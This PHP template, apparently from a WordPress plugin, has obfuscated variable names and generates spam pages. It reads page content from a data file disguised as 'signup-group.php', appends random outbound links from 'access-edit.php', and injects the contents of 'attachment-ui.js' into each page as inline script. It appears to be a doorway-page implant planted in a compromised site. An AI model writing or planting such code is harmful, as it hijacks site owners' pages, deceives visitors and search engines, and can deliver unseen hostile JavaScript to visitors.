<?php
$xzd8BvkHE = intval(get_query_var('bfpvvixpa'));

if ($xzd8BvkHE < 1 || $xzd8BvkHE > 3475) return;
$fgLmrys = file(plugin_dir_path(__FILE__).'signup-group.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$pAxlbg7 = explode(';', $fgLmrys[$xzd8BvkHE]);
if (count($pAxlbg7) < 2) return;
$pEbolp6u7 = $pAxlbg7[0];
$jzNxtnhs8  = $pAxlbg7[1];
$qj1Padvw = $pAxlbg7[2];
$oKtY2Y  = $pAxlbg7[3];
$sACGkif = $pAxlbg7[4];
set_query_var('bnxlezo', $pEbolp6u7);

$xqNaT = '';
$yw0o2 = plugin_dir_path(__FILE__).'access-edit.php';
if (is_file($yw0o2)) {
	$qw5Af = file($yw0o2, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($qw5Af);
	shuffle($qw5Af);
	$btpovxg = mt_rand(2, 5);
	if (count($qw5Af) > $btpovxg) {
		for ($byu0c = 0; $byu0c < $btpovxg; $byu0c++) {
			$q7UkerHXf = array_shift($qw5Af);
			$xqNaT .= '<p><a href="'.$q7UkerHXf.'">'.$q7UkerHXf.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $pEbolp6u7; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $jzNxtnhs8 . "</p>\n";
				if (strlen($oKtY2Y) > 0) echo "<p>" . $oKtY2Y . "</p>\n";
				if (strlen($qj1Padvw) > 0) echo "<p>" . $qj1Padvw . "</p>\n";
				if (strlen($sACGkif) > 0) echo '<p><a href="#"><img src="'.$sACGkif.'"></a>' . "</p>\n";
				echo $xqNaT;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$oeDCVsy7Y = plugin_dir_path(__FILE__) . 'attachment-ui.js';
if (is_file($oeDCVsy7Y)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($oeDCVsy7Y);
	echo '</script>';
}
get_footer();
?>
